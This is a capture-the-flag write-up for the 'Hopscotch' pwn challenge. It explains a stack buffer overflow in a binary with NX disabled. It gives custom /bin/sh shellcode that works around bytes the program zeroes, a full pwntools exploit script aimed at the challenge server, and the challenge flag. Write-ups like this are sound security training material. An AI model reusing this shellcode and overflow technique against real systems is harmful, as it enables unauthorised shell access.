# Hopscotch

One childhood pasttime I never got to experience much is Hopscotch, a game  where you jump and hop over boxes to reach to the goal.

Won't you play with me?

`nc chals.whitehacks.ctf.sg 20401`

**Files**: [hopscotch](https://api.whitehacks.ctf.sg/file?id=ckltb09fg0ss0080733boc0w3&name=hopscotch)

```sh
$ checksec hopscotch
[*] 'hopscotch'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     # !
    Stack:    No canary found   # !
    NX:       NX disabled       # ! 
    PIE:      No PIE (0x400000) # !
    RWX:      Has RWX segments  # ! 
```

Yes, that's _everything_ red.

## solving

`main()` is very simple:

```c
int main() {
  char s[48]; // [rsp+0h] [rbp-40h] BYREF
  int canary; // [rsp+30h] [rbp-10h]
  unsigned int i; // [rsp+3Ch] [rbp-4h]

  setup_IO();
  canary = 1337;
  printf("Buffer: %p\n", s);
  printf("Enter input: ");
  fgets(s, 96, stdin);
  for ( i = 8; i <= 0x2F; i += 12 )
    s[i] = 0;
  if ( canary != 1337 ) {
    puts("Bad canary!");
    exit(-1);
  }
  return 0;
}
```

We're given a stack leak and a buffer overflow with NX off. The obvious answer here is to just run `/bin/sh` shellcode, but the program has a for-loop that removes a few bytes. I edited [this](https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html) shellcode a little bit to get here:

```asm
0:  31 f6                   xor    esi,esi
2:  56                      push   rsi
3:  90                      nop
4:  90                      nop
5:  90                      nop
6:  48 bb 00 62 69 6e 2f    movabs rbx,0x68732f2f6e696200
d:  2f 73 68
10: 48 81 c3 2f 00 00 00    add    rbx,0x2f
17: 53                      push   rbx
18: 54                      push   rsp
19: 5f                      pop    rdi
1a: f7 ee                   imul   esi
1c: b0 3b                   mov    al,0x3b
1e: 0f 05                   syscall 
```
Other teams had smarter solutions. Instead of my bulky `add rbx` instruction, you could use a `mov al, 0x0` (`\xb0\x00`) to get a cheap almost-NOP<sup>1</sup>. Another solution skipped the prototypical 22-byte `/bin/sh` shellcode altogether, using simple `mov`s to reach a solution:

![](lol.png)

The intended solution, as stated by the challenge author, was to use a `jmp 0x2` (`\xeb\x00`) instruction as a 2-byte NOP with a nul-byte inside. 

In any case, here was my script:
```python
from pwnscripts import *
context.binary = 'hopscotch'
r = remote('chals.whitehacks.ctf.sg', 20401)
context.log_level = 'debug'
stack_leak = unpack_hex(r.recvline())
assem = b'\x31\xF6\x56\x90\x90\x90\x48\xBB\x00\x62\x69\x6E\x2F\x2F\x73\x68\x48\x81\xC3\x2F\x00\x00\x00\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

payload = fit({
    0x00: assem,
    0x30: pack(1337),
    0x48: stack_leak,
})
r.sendlineafter('input: ', payload)
r.interactive()
```

## Flag

`WH2021{8a11f6615742a_h0p_st3p_jUMp_Dr3w_Dr@w_dr@wN}`

1. This was from the winning team.
